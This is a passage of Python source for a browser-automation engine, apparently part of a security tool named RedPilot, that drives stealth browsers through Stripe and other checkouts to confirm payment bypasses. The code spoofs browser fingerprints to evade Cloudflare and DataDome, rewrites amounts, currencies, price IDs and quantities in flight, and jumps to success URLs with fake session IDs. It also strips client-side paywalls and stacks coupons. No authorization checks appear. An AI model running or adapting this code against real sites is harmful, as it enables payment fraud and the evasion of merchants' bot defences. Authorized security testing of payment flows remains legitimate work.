"""Browser-driven payment flow testing engine.

Closes the Tier-1 architecture gap: RedPilot can detect payment bypass
patterns in HTTP traffic but until now could never drive a real browser
through Stripe Checkout, select a deferred payment method, manipulate a
return URL, and verify whether entitlement was granted without payment.

Uses Playwright (pre-installed) for all browser automation.  Degrades
gracefully when Playwright is unavailable -- every public entry point
returns a PaymentFlowResult with an error list explaining why.

Companion to browser_surface.py (which PLANS action sequences) and
payment_flow_graph.py (which models the payment state machine).  This
module EXECUTES.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import random
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any
from urllib.parse import urlencode, urljoin, urlparse, parse_qs

try:
    from playwright.async_api import (
        async_playwright,
        Browser,
        BrowserContext,
        Page,
        Route,
        Response,
    )
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    Browser = Any  # type: ignore[assignment,misc]
    BrowserContext = Any  # type: ignore[assignment,misc]
    Page = Any  # type: ignore[assignment,misc]
    Route = Any  # type: ignore[assignment,misc]
    Response = Any  # type: ignore[assignment,misc]


# ---------------------------------------------------------------------------
# Enums
# ---------------------------------------------------------------------------

class PaymentFlowType(str, Enum):
    STRIPE_CHECKOUT = "stripe_checkout"
    STRIPE_ELEMENTS = "stripe_elements"
    PAYPAL_BUTTONS = "paypal_buttons"
    BRAINTREE_DROPIN = "braintree_dropin"
    ADYEN_CHECKOUT = "adyen_checkout"
    CUSTOM_FORM = "custom_form"


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class FlowStep:
    action: str
    selector: str = ""
    value: str = ""
    wait_for: str = ""
    screenshot: bool = False
    extract_data: list[str] = field(default_factory=list)


@dataclass
class PaymentFlowResult:
    flow_type: PaymentFlowType
    steps_completed: int = 0
    total_steps: int = 0
    entitlement_granted: bool = False
    payment_confirmed: bool = False
    amount_charged: int = 0
    currency: str = ""
    payment_status: str = ""
    screenshots: list[str] = field(default_factory=list)
    extracted_data: dict[str, Any] = field(default_factory=dict)
    errors: list[str] = field(default_factory=list)
    timing_ms: int = 0


def _unavailable_result(flow_type: PaymentFlowType, reason: str = "playwright not installed") -> PaymentFlowResult:
    return PaymentFlowResult(flow_type=flow_type, errors=[reason])


# ---------------------------------------------------------------------------
# Bot-evasion layer
# ---------------------------------------------------------------------------

class BotEvasionLayer:
    """Anti-bot-detection countermeasures for browser automation.

    Enterprise targets layer Cloudflare Bot Management, Turnstile,
    DataDome, PerimeterX, and custom fingerprinting.  Proof of Human
    2026: Cloudflare Turnstile catches only 42.1 % of automated sessions.
    Without evasion, probes are blocked before the first checkout loads.
    """

    _VIEWPORTS: list[dict[str, int]] = [
        {"width": 1920, "height": 1080},
        {"width": 1536, "height": 864},
        {"width": 1440, "height": 900},
        {"width": 1366, "height": 768},
        {"width": 1280, "height": 720},
        {"width": 2560, "height": 1440},
        {"width": 1680, "height": 1050},
    ]

    _USER_AGENTS: list[str] = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    ]

    _STEALTH_SCRIPTS: list[str] = [
        # Remove navigator.webdriver flag
        "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});",
        # Fake plugins array
        """Object.defineProperty(navigator, 'plugins', {
            get: () => [
                {name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer'},
                {name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai'},
                {name: 'Native Client', filename: 'internal-nacl-plugin'},
            ],
        });""",
        # Fake languages
        "Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});",
        # Override permissions query
        """const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) =>
            parameters.name === 'notifications'
                ? Promise.resolve({state: Notification.permission})
                : originalQuery(parameters);""",
        # Chrome runtime stub
        "window.chrome = {runtime: {}, loadTimes: () => ({}), csi: () => ({})};",
        # Hide automation-controlled window
        "Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 0});",
        # WebGL vendor/renderer spoofing
        """const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Inc.';
            if (parameter === 37446) return 'Intel Iris OpenGL Engine';
            return getParameter.call(this, parameter);
        };""",
    ]

    @staticmethod
    def get_stealth_browser_config() -> dict[str, Any]:
        return {
            "headless": True,
            "args": [
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-accelerated-2d-canvas",
                "--disable-gpu",
                "--lang=en-US,en",
            ],
        }

    @staticmethod
    def get_realistic_viewport() -> dict[str, int]:
        return random.choice(BotEvasionLayer._VIEWPORTS)

    @staticmethod
    def get_realistic_user_agent() -> str:
        return random.choice(BotEvasionLayer._USER_AGENTS)

    @staticmethod
    async def add_human_behavior(page: Page) -> None:
        if not PLAYWRIGHT_AVAILABLE:
            return
        try:
            vw = await page.evaluate("window.innerWidth")
            vh = await page.evaluate("window.innerHeight")
            for _ in range(random.randint(2, 5)):
                x = random.randint(100, max(vw - 100, 200))
                y = random.randint(100, max(vh - 100, 200))
                await page.mouse.move(x, y, steps=random.randint(5, 15))
                await asyncio.sleep(random.uniform(0.05, 0.3))
            scroll_y = random.randint(100, 500)
            await page.mouse.wheel(0, scroll_y)
            await asyncio.sleep(random.uniform(0.2, 0.8))
        except Exception:
            pass

    @staticmethod
    async def apply_stealth(page: Page) -> None:
        if not PLAYWRIGHT_AVAILABLE:
            return
        for script in BotEvasionLayer._STEALTH_SCRIPTS:
            try:
                await page.add_init_script(script)
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Payment flow discovery
# ---------------------------------------------------------------------------

class PaymentFlowDiscovery:
    """Crawls a target site to locate checkout pages and identify providers."""

    _CHECKOUT_INDICATORS: list[re.Pattern[str]] = [
        re.compile(r"(checkout|payment|subscribe|purchase|buy|upgrade|billing)", re.I),
        re.compile(r"(stripe\.com/pay|checkout\.stripe\.com)", re.I),
        re.compile(r"(paypal\.com/checkoutnow|paypal\.com/sdk)", re.I),
    ]

    _PRICING_INDICATORS: list[re.Pattern[str]] = [
        re.compile(r"(pricing|plans|packages|tiers|subscription|membership)", re.I),
        re.compile(r"(\$\d+[\./]\s*(mo|month|yr|year)|/month|/year|per\s*month)", re.I),
        re.compile(r"(free\s*trial|start\s*free|try\s*for\s*free|no\s*credit\s*card)", re.I),
    ]

    _PAYMENT_FORM_SELECTORS: list[str] = [
        "iframe[src*='stripe']",
        "iframe[src*='js.stripe.com']",
        "#card-element",
        ".StripeElement",
        "[data-stripe]",
        "#paypal-button-container",
        ".paypal-buttons",
        "#braintree-dropin",
        ".braintree-dropin",
        "#adyen-checkout",
        ".adyen-checkout__payment-method",
        "input[name='cardnumber']",
        "input[name='cc-number']",
        "input[autocomplete='cc-number']",
    ]

    _PROVIDER_DETECT: dict[PaymentFlowType, list[re.Pattern[str]]] = {
        PaymentFlowType.STRIPE_CHECKOUT: [
            re.compile(r"checkout\.stripe\.com", re.I),
            re.compile(r"stripe\.redirectToCheckout", re.I),
        ],
        PaymentFlowType.STRIPE_ELEMENTS: [
            re.compile(r"js\.stripe\.com/v3", re.I),
            re.compile(r"stripe\.createPaymentMethod|stripe\.confirmCardPayment", re.I),
            re.compile(r"\.StripeElement|#card-element", re.I),
        ],
        PaymentFlowType.PAYPAL_BUTTONS: [
            re.compile(r"paypal\.com/sdk/js", re.I),
            re.compile(r"paypal\.Buttons|paypal-button-container", re.I),
        ],
        PaymentFlowType.BRAINTREE_DROPIN: [
            re.compile(r"braintreegateway\.com|braintree-web", re.I),
            re.compile(r"braintree\.dropin\.create|braintree-dropin", re.I),
        ],
        PaymentFlowType.ADYEN_CHECKOUT: [
            re.compile(r"checkoutshopper.*adyen\.com|adyen\.com/checkoutshopper", re.I),
            re.compile(r"AdyenCheckout|adyen-checkout", re.I),
        ],
    }

    async def crawl_for_payment_pages(
        self, base_url: str, max_depth: int = 3,
    ) -> list[str]:
        if not PLAYWRIGHT_AVAILABLE:
            return []
        found: list[str] = []
        visited: set[str] = set()
        queue: list[tuple[str, int]] = [(base_url, 0)]
        parsed_base = urlparse(base_url)

        async with async_playwright() as pw:
            config = BotEvasionLayer.get_stealth_browser_config()
            browser = await pw.chromium.launch(**config)
            ctx = await browser.new_context(
                viewport=BotEvasionLayer.get_realistic_viewport(),
                user_agent=BotEvasionLayer.get_realistic_user_agent(),
            )
            page = await ctx.new_page()
            await BotEvasionLayer.apply_stealth(page)

            while queue:
                url, depth = queue.pop(0)
                if url in visited or depth > max_depth:
                    continue
                visited.add(url)
                try:
                    await page.goto(url, wait_until="domcontentloaded", timeout=15000)
                    await BotEvasionLayer.add_human_behavior(page)
                    content = await page.content()

                    is_payment = any(p.search(content) for p in self._CHECKOUT_INDICATORS)
                    is_pricing = any(p.search(content) for p in self._PRICING_INDICATORS)
                    has_form = False
                    for sel in self._PAYMENT_FORM_SELECTORS:
                        try:
                            el = await page.query_selector(sel)
                            if el:
                                has_form = True
                                break
                        except Exception:
                            pass
                    if is_payment or is_pricing or has_form:
                        found.append(url)

                    if depth < max_depth:
                        links = await page.eval_on_selector_all(
                            "a[href]", "els => els.map(e => e.href)",
                        )
                        for link in links[:50]:
                            parsed = urlparse(link)
                            if parsed.netloc == parsed_base.netloc and link not in visited:
                                queue.append((link, depth + 1))
                except Exception:
                    continue

            await browser.close()
        return found

    async def identify_payment_provider(self, page_url: str) -> PaymentFlowType:
        if not PLAYWRIGHT_AVAILABLE:
            return PaymentFlowType.CUSTOM_FORM
        async with async_playwright() as pw:
            config = BotEvasionLayer.get_stealth_browser_config()
            browser = await pw.chromium.launch(**config)
            ctx = await browser.new_context(
                viewport=BotEvasionLayer.get_realistic_viewport(),
                user_agent=BotEvasionLayer.get_realistic_user_agent(),
            )
            page = await ctx.new_page()
            await BotEvasionLayer.apply_stealth(page)
            try:
                await page.goto(page_url, wait_until="networkidle", timeout=20000)
                content = await page.content()
                scripts = await page.eval_on_selector_all(
                    "script[src]", "els => els.map(e => e.src)",
                )
                full_text = content + " ".join(scripts)
                for provider, patterns in self._PROVIDER_DETECT.items():
                    if any(p.search(full_text) for p in patterns):
                        await browser.close()
                        return provider
            except Exception:
                pass
            await browser.close()
        return PaymentFlowType.CUSTOM_FORM


# ---------------------------------------------------------------------------
# Checkout request interceptor
# ---------------------------------------------------------------------------

class CheckoutInterceptor:
    """Playwright route interceptor for modifying payment requests in-flight.

    Hooks into Stripe/PayPal/Braintree API calls to tamper with amounts,
    currencies, price IDs, and session parameters -- exactly what an
    attacker with browser dev-tools would do, but automated.
    """

    def __init__(self) -> None:
        self._intercepted: list[dict[str, Any]] = []
        self._modifications: list[dict[str, Any]] = []

    async def intercept_stripe_checkout(self, page: Page) -> dict[str, Any]:
        if not PLAYWRIGHT_AVAILABLE:
            return {"error": "playwright not available"}
        captured: dict[str, Any] = {}

        async def _handle(route: Route) -> None:
            request = route.request
            if "/v1/checkout/sessions" in request.url and request.method == "POST":
                captured["url"] = request.url
                captured["method"] = request.method
                captured["headers"] = dict(request.headers)
                body = request.post_data or ""
                captured["body"] = body
                captured["parsed"] = parse_qs(body)
                self._intercepted.append(captured)
            await route.continue_()

        await page.route("**/v1/checkout/sessions*", _handle)
        await page.route("**/api.stripe.com/**", _handle)
        return captured

    async def intercept_payment_intent(self, page: Page) -> dict[str, Any]:
        if not PLAYWRIGHT_AVAILABLE:
            return {"error": "playwright not available"}
        captured: dict[str, Any] = {}

        async def _handle(route: Route) -> None:
            request = route.request
            url = request.url
            if ("/v1/payment_intents" in url) and request.method == "POST":
                captured["url"] = url
                captured["method"] = request.method
                body = request.post_data or ""
                captured["body"] = body
                captured["parsed"] = parse_qs(body)
                self._intercepted.append(captured)
            await route.continue_()

        await page.route("**/v1/payment_intents*", _handle)
        return captured

    async def modify_amount(self, page: Page, new_amount: int) -> dict[str, Any]:
        if not PLAYWRIGHT_AVAILABLE:
            return {"error": "playwright not available"}
        result: dict[str, Any] = {"original_amount": None, "new_amount": new_amount}

        async def _handle(route: Route) -> None:
            request = route.request
            body = request.post_data or ""
            if "amount=" in body:
                original = re.search(r"amount=(\d+)", body)
                if original:
                    result["original_amount"] = int(original.group(1))
                body = re.sub(r"amount=\d+", f"amount={new_amount}", body)
                self._modifications.append({
                    "url": request.url,
                    "field": "amount",
                    "original": result["original_amount"],
                    "modified": new_amount,
                })
                await route.continue_(post_data=body)
                return
            await route.continue_()

        await page.route("**/v1/checkout/sessions*", _handle)
        await page.route("**/v1/payment_intents*", _handle)
        return result

    async def modify_currency(self, page: Page, new_currency: str) -> dict[str, Any]:
        if not PLAYWRIGHT_AVAILABLE:
            return {"error": "playwright not available"}
        result: dict[str, Any] = {"original_currency": None, "new_currency": new_currency}

        async def _handle(route: Route) -> None:
            request = route.request
            body = request.post_data or ""
            if "currency=" in body:
                original = re.search(r"currency=([a-zA-Z]{3})", body)
                if original:
                    result["original_currency"] = original.group(1)
                body = re.sub(r"currency=[a-zA-Z]{3}", f"currency={new_currency}", body)
                self._modifications.append({
                    "url": request.url,
                    "field": "currency",
                    "original": result["original_currency"],
                    "modified": new_currency,
                })
                await route.continue_(post_data=body)
                return
            await route.continue_()

        await page.route("**/v1/checkout/sessions*", _handle)
        await page.route("**/v1/payment_intents*", _handle)
        return result

    def get_intercepted(self) -> list[dict[str, Any]]:
        return list(self._intercepted)

    def get_modifications(self) -> list[dict[str, Any]]:
        return list(self._modifications)


# ---------------------------------------------------------------------------
# Main browser payment flow engine
# ---------------------------------------------------------------------------

class BrowserPaymentFlowEngine:
    """Drives a real browser through payment flows to verify bypass vectors.

    This is what turns RedPilot from a detection engine ("this pattern
    exists in traffic") into a verification engine ("this bypass works
    end-to-end").  Closes the gap between leads and confirmed P0 findings.
    """

    def __init__(self, headless: bool = True, timeout_ms: int = 30000) -> None:
        self._headless = headless
        self._timeout = timeout_ms
        self._discovery = PaymentFlowDiscovery()
        self._interceptor = CheckoutInterceptor()
        self._evasion = BotEvasionLayer()
        self._results: list[PaymentFlowResult] = []

    async def _launch_context(self) -> tuple[Any, Any, Any]:
        config = BotEvasionLayer.get_stealth_browser_config()
        config["headless"] = self._headless
        pw = await async_playwright().start()
        browser = await pw.chromium.launch(**config)
        ctx = await browser.new_context(
            viewport=BotEvasionLayer.get_realistic_viewport(),
            user_agent=BotEvasionLayer.get_realistic_user_agent(),
        )
        return pw, browser, ctx

    async def _new_page(self, ctx: Any) -> Any:
        page = await ctx.new_page()
        await BotEvasionLayer.apply_stealth(page)
        return page

    async def discover_payment_flows(self, base_url: str) -> list[dict[str, Any]]:
        if not PLAYWRIGHT_AVAILABLE:
            return [{"error": "playwright not available"}]
        pages = await self._discovery.crawl_for_payment_pages(base_url)
        flows: list[dict[str, Any]] = []
        for page_url in pages:
            provider = await self._discovery.identify_payment_provider(page_url)
            flows.append({"url": page_url, "provider": provider.value})
        return flows

    async def test_stripe_checkout_bypass(self, checkout_url: str) -> PaymentFlowResult:
        """Drive Stripe Checkout with SEPA (deferred), check entitlement when unpaid.

        CVE-2026-41432 pattern: checkout.session.completed fires BEFORE the
        SEPA debit clears.  If the app trusts that event alone, the user gets
        access while payment_status is still 'unpaid'.
        """
        if not PLAYWRIGHT_AVAILABLE:
            return _unavailable_result(PaymentFlowType.STRIPE_CHECKOUT)
        t0 = time.monotonic()
        result = PaymentFlowResult(flow_type=PaymentFlowType.STRIPE_CHECKOUT, total_steps=5)
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)
            await self._interceptor.intercept_stripe_checkout(page)
            await self._interceptor.intercept_payment_intent(page)

            # Step 1: Navigate to checkout
            await page.goto(checkout_url, wait_until="networkidle", timeout=self._timeout)
            await self._evasion.add_human_behavior(page)
            result.steps_completed = 1

            # Step 2: Look for Stripe Checkout redirect or embedded form
            stripe_frame = None
            for sel in ["iframe[src*='checkout.stripe.com']", "iframe[src*='js.stripe.com']"]:
                try:
                    stripe_frame = await page.wait_for_selector(sel, timeout=5000)
                    break
                except Exception:
                    pass

            if stripe_frame:
                result.steps_completed = 2
                result.extracted_data["stripe_frame_found"] = True
            else:
                content = await page.content()
                if "checkout.stripe.com" in content or "stripe" in content.lower():
                    result.steps_completed = 2
                    result.extracted_data["stripe_redirect_detected"] = True
                else:
                    result.errors.append("No Stripe Checkout form/redirect found")

            # Step 3: Attempt to select a deferred payment method (SEPA)
            try:
                sepa_selectors = [
                    "[data-testid='sepa_debit']",
                    "button:has-text('SEPA')",
                    "[data-pm='sepa_debit']",
                    "text=Bank debit",
                    "text=SEPA",
                ]
                for sel in sepa_selectors:
                    try:
                        el = await page.wait_for_selector(sel, timeout=3000)
                        if el:
                            await el.click()
                            result.steps_completed = 3
                            result.extracted_data["deferred_method_selected"] = "sepa_debit"
                            break
                    except Exception:
                        continue
            except Exception as exc:
                result.errors.append(f"SEPA selection failed: {exc}")

            # Step 4: Check the return URL for payment_status parameter
            current_url = page.url
            parsed = urlparse(current_url)
            qs = parse_qs(parsed.query)
            if "payment_status" in qs:
                result.payment_status = qs["payment_status"][0]
                result.extracted_data["payment_status_in_url"] = result.payment_status
            if "session_id" in qs:
                result.extracted_data["session_id"] = qs["session_id"][0]
            result.steps_completed = max(result.steps_completed, 4)

            # Step 5: Check if entitlement was granted despite unpaid status
            content = await page.content()
            entitlement_markers = [
                r"(?:premium|pro|enterprise|paid)\s*(?:plan|tier|access)",
                r"subscription.*active",
                r"welcome.*(?:premium|pro)",
                r"features?\s*(?:unlocked|enabled|activated)",
                r"upgrade.*(?:success|complete)",
            ]
            for marker in entitlement_markers:
                if re.search(marker, content, re.I):
                    result.entitlement_granted = True
                    result.extracted_data["entitlement_marker"] = marker
                    break
            result.steps_completed = 5

            if result.entitlement_granted and result.payment_status in ("unpaid", ""):
                result.extracted_data["vulnerability_confirmed"] = True
                result.extracted_data["finding"] = (
                    "ACCESS-WITHOUT-PAYMENT: Entitlement granted while payment_status "
                    f"is '{result.payment_status}'. Matches CVE-2026-41432 pattern."
                )

            # Capture intercepted requests
            result.extracted_data["intercepted_requests"] = self._interceptor.get_intercepted()
        except Exception as exc:
            result.errors.append(str(exc))
        finally:
            await browser.close()
            await pw.stop()
            result.timing_ms = int((time.monotonic() - t0) * 1000)
        self._results.append(result)
        return result

    async def test_return_url_manipulation(self, checkout_url: str) -> PaymentFlowResult:
        """Manipulate success_url / return_url to bypass payment verification.

        Many integrations redirect to success_url with a session_id param.
        If the server trusts the redirect without verifying payment status
        server-side, navigating directly to success_url grants access.
        """
        if not PLAYWRIGHT_AVAILABLE:
            return _unavailable_result(PaymentFlowType.STRIPE_CHECKOUT)
        t0 = time.monotonic()
        result = PaymentFlowResult(flow_type=PaymentFlowType.STRIPE_CHECKOUT, total_steps=4)
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)
            captured_urls: list[str] = []

            async def _capture_redirect(route: Route) -> None:
                url = route.request.url
                if any(k in url for k in ("success_url", "return_url", "cancel_url")):
                    captured_urls.append(url)
                body = route.request.post_data or ""
                for key in ("success_url", "return_url"):
                    match = re.search(rf"{key}=([^&]+)", body)
                    if match:
                        captured_urls.append(match.group(1))
                await route.continue_()

            await page.route("**/*", _capture_redirect)

            # Step 1: Navigate to checkout to discover success URL
            await page.goto(checkout_url, wait_until="networkidle", timeout=self._timeout)
            result.steps_completed = 1

            # Step 2: Extract success URL from page content
            content = await page.content()
            url_patterns = [
                re.compile(r'success[_-]?url["\s:=]+["\']?(https?://[^"\'&\s]+)', re.I),
                re.compile(r'return[_-]?url["\s:=]+["\']?(https?://[^"\'&\s]+)', re.I),
                re.compile(r'(?:window\.location|location\.href)\s*=\s*["\']([^"\']+(?:success|thank|confirm)[^"\']*)', re.I),
            ]
            success_urls: list[str] = list(captured_urls)
            for pat in url_patterns:
                for m in pat.finditer(content):
                    success_urls.append(m.group(1))
            result.extracted_data["discovered_success_urls"] = success_urls
            result.steps_completed = 2

            # Step 3: Navigate directly to success URL (bypass payment)
            if success_urls:
                target_url = success_urls[0]
                # Inject a fake session_id if the URL expects one
                if "{CHECKOUT_SESSION_ID}" in target_url:
                    target_url = target_url.replace(
                        "{CHECKOUT_SESSION_ID}",
                        "cs_test_" + hashlib.md5(b"bypass_test").hexdigest()[:24],
                    )
                result.extracted_data["bypass_url"] = target_url
                await page.goto(target_url, wait_until="networkidle", timeout=self._timeout)
                result.steps_completed = 3

                # Step 4: Check if entitlement was granted
                content = await page.content()
                status_code = 200
                try:
                    resp = page.url
                    result.extracted_data["final_url"] = resp
                except Exception:
                    pass

                markers = [
                    r"(?:success|thank|welcome|congratulations)",
                    r"(?:premium|pro|enterprise).*(?:activated|enabled)",
                    r"subscription.*(?:active|started)",
                ]
                for marker in markers:
                    if re.search(marker, content, re.I):
                        result.entitlement_granted = True
                        break

                error_markers = [
                    r"(?:invalid|expired|not found).*session",
                    r"(?:payment|checkout).*(?:failed|incomplete|required)",
                    r"(?:error|unauthorized|forbidden)",
                ]
                has_error = any(re.search(m, content, re.I) for m in error_markers)

                if result.entitlement_granted and not has_error:
                    result.extracted_data["vulnerability_confirmed"] = True
                    result.extracted_data["finding"] = (
                        "RETURN-URL-BYPASS: Direct navigation to success URL grants "
                        "entitlement without completing payment. Server does not verify "
                        "payment status on the return flow."
                    )
                result.steps_completed = 4
            else:
                result.errors.append("No success/return URL discovered")
        except Exception as exc:
            result.errors.append(str(exc))
        finally:
            await browser.close()
            await pw.stop()
            result.timing_ms = int((time.monotonic() - t0) * 1000)
        self._results.append(result)
        return result

    async def test_client_side_paywall(self, page_url: str) -> PaymentFlowResult:
        """Check if a paywall is enforced client-side only (CSS/JS hiding)."""
        if not PLAYWRIGHT_AVAILABLE:
            return _unavailable_result(PaymentFlowType.CUSTOM_FORM)
        t0 = time.monotonic()
        result = PaymentFlowResult(flow_type=PaymentFlowType.CUSTOM_FORM, total_steps=3)
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)

            # Step 1: Load page normally
            await page.goto(page_url, wait_until="networkidle", timeout=self._timeout)
            result.steps_completed = 1

            # Step 2: Remove all paywall overlays and CSS hiding
            hidden_content = await page.evaluate("""() => {
                const findings = [];
                // Remove paywall overlays
                const overlaySelectors = [
                    '[class*="paywall"]', '[id*="paywall"]',
                    '[class*="overlay"]', '[class*="modal"]',
                    '[class*="gate"]', '[class*="blur"]',
                    '[class*="locked"]', '[class*="premium-wall"]',
                ];
                for (const sel of overlaySelectors) {
                    document.querySelectorAll(sel).forEach(el => {
                        el.style.display = 'none';
                        findings.push({type: 'overlay_removed', selector: sel});
                    });
                }
                // Unhide content hidden with CSS
                document.querySelectorAll('[style*="display: none"], [style*="visibility: hidden"], [style*="opacity: 0"], [hidden]').forEach(el => {
                    const text = (el.textContent || '').trim();
                    if (text.length > 50) {
                        el.style.display = 'block';
                        el.style.visibility = 'visible';
                        el.style.opacity = '1';
                        el.removeAttribute('hidden');
                        findings.push({type: 'content_unhidden', length: text.length});
                    }
                });
                // Remove scroll lock
                document.body.style.overflow = 'auto';
                document.documentElement.style.overflow = 'auto';
                // Check for content that was behind the paywall
                const allText = document.body.innerText;
                return {findings, text_length: allText.length};
            }""")
            result.extracted_data["paywall_elements"] = hidden_content.get("findings", [])
            result.steps_completed = 2

            # Step 3: Compare — was premium content accessible via CSS manipulation?
            if hidden_content.get("findings"):
                visible_content = await page.evaluate("() => document.body.innerText")
                result.extracted_data["content_length_after"] = len(visible_content)
                result.entitlement_granted = True
                result.extracted_data["vulnerability_confirmed"] = True
                result.extracted_data["finding"] = (
                    f"CLIENT-SIDE-PAYWALL: Removed {len(hidden_content['findings'])} paywall "
                    f"elements via CSS manipulation. Premium content is delivered to the browser "
                    f"and hidden client-side. No server-side access control."
                )
            result.steps_completed = 3
        except Exception as exc:
            result.errors.append(str(exc))
        finally:
            await browser.close()
            await pw.stop()
            result.timing_ms = int((time.monotonic() - t0) * 1000)
        self._results.append(result)
        return result

    async def test_price_id_manipulation(
        self, checkout_url: str, price_ids: list[str],
    ) -> PaymentFlowResult:
        """Swap priceId parameter to get a higher tier at a lower price.

        Cap #2222 pattern: checkout endpoint accepts any priceId without
        validating against an allowlist.  Supply a live price for a cheaper
        plan, get full Pro entitlement.
        """
        if not PLAYWRIGHT_AVAILABLE:
            return _unavailable_result(PaymentFlowType.STRIPE_CHECKOUT)
        t0 = time.monotonic()
        result = PaymentFlowResult(
            flow_type=PaymentFlowType.STRIPE_CHECKOUT,
            total_steps=len(price_ids) + 1,
        )
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)
            accepted_prices: list[dict[str, Any]] = []

            for i, price_id in enumerate(price_ids):
                async def _swap_price(route: Route) -> None:
                    body = route.request.post_data or ""
                    if "price" in body or "line_items" in body:
                        body = re.sub(
                            r"(price_[A-Za-z0-9]+|price=)[A-Za-z0-9]+",
                            f"\\g<1>{price_id}",
                            body,
                        )
                    await route.continue_(post_data=body)

                await page.route("**/*checkout*", _swap_price)
                await page.route("**/api.stripe.com/**", _swap_price)

                try:
                    await page.goto(checkout_url, wait_until="networkidle", timeout=self._timeout)
                    content = await page.content()
                    has_error = bool(re.search(
                        r"(invalid.*price|price.*not.*found|no such price|error)",
                        content, re.I,
                    ))
                    if not has_error:
                        accepted_prices.append({
                            "price_id": price_id,
                            "url": page.url,
                            "accepted": True,
                        })
                except Exception as exc:
                    accepted_prices.append({
                        "price_id": price_id,
                        "accepted": False,
                        "error": str(exc),
                    })
                result.steps_completed = i + 1
                await page.unroute("**/*checkout*")
                await page.unroute("**/api.stripe.com/**")

            result.extracted_data["price_id_results"] = accepted_prices
            accepted = [p for p in accepted_prices if p.get("accepted")]
            if len(accepted) > 1:
                result.entitlement_granted = True
                result.extracted_data["vulnerability_confirmed"] = True
                result.extracted_data["finding"] = (
                    f"PRICE-ID-MANIPULATION: {len(accepted)}/{len(price_ids)} arbitrary "
                    f"price IDs accepted. No server-side allowlist validation. "
                    f"Matches Cap #2222 pattern."
                )
            result.steps_completed = result.total_steps
        except Exception as exc:
            result.errors.append(str(exc))
        finally:
            await browser.close()
            await pw.stop()
            result.timing_ms = int((time.monotonic() - t0) * 1000)
        self._results.append(result)
        return result

    async def test_quantity_manipulation(self, checkout_url: str) -> PaymentFlowResult:
        """Test quantity=0 and quantity=-1 in checkout requests."""
        if not PLAYWRIGHT_AVAILABLE:
            return _unavailable_result(PaymentFlowType.STRIPE_CHECKOUT)
        t0 = time.monotonic()
        result = PaymentFlowResult(flow_type=PaymentFlowType.STRIPE_CHECKOUT, total_steps=3)
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)
            test_quantities = [0, -1, 999999999]
            accepted: list[dict[str, Any]] = []

            for qty in test_quantities:
                async def _swap_qty(route: Route, q: int = qty) -> None:
                    body = route.request.post_data or ""
                    if "quantity" in body:
                        body = re.sub(r"quantity=\d+", f"quantity={q}", body)
                    await route.continue_(post_data=body)

                await page.route("**/*checkout*", _swap_qty)
                await page.route("**/api.stripe.com/**", _swap_qty)
                try:
                    await page.goto(checkout_url, wait_until="networkidle", timeout=self._timeout)
                    content = await page.content()
                    has_error = bool(re.search(
                        r"(invalid.*quantity|error|must be.*positive)",
                        content, re.I,
                    ))
                    accepted.append({
                        "quantity": qty,
                        "accepted": not has_error,
                        "url": page.url,
                    })
                except Exception:
                    accepted.append({"quantity": qty, "accepted": False})
                result.steps_completed += 1
                await page.unroute("**/*checkout*")
                await page.unroute("**/api.stripe.com/**")

            result.extracted_data["quantity_results"] = accepted
            bad_accepted = [a for a in accepted if a["accepted"] and a["quantity"] <= 0]
            if bad_accepted:
                result.entitlement_granted = True
                result.extracted_data["vulnerability_confirmed"] = True
                result.extracted_data["finding"] = (
                    f"QUANTITY-MANIPULATION: Zero/negative quantities accepted: "
                    f"{[a['quantity'] for a in bad_accepted]}. CWE-190."
                )
        except Exception as exc:
            result.errors.append(str(exc))
        finally:
            await browser.close()
            await pw.stop()
            result.timing_ms = int((time.monotonic() - t0) * 1000)
        self._results.append(result)
        return result

    async def test_coupon_stacking(
        self, checkout_url: str, coupon_codes: list[str],
    ) -> PaymentFlowResult:
        """Apply multiple coupons to exceed 100% discount."""
        if not PLAYWRIGHT_AVAILABLE:
            return _unavailable_result(PaymentFlowType.STRIPE_CHECKOUT)
        t0 = time.monotonic()
        result = PaymentFlowResult(
            flow_type=PaymentFlowType.STRIPE_CHECKOUT,
            total_steps=len(coupon_codes) + 1,
        )
        pw, browser, ctx = await self._launch_context()
        try:
            page = await self._new_page(ctx)
            applied: list[dict[str, Any]] = []
            total_discount = 0

            for code in coupon_codes:
                try:
                    await page.goto(checkout_url, wait_until="networkidle", timeout=self._timeout)
                    coupon_input = None
                    for sel in [
                        "input[name*='coupon']", "input[name*='promo']",
                        "input[placeholder*='coupon']", "input[placeholder*='promo']",
                        "#coupon-input", "#promo-code",
                        "[data-testid*='coupon']", "[data-testid*='promo']",
                    ]:
                        try:
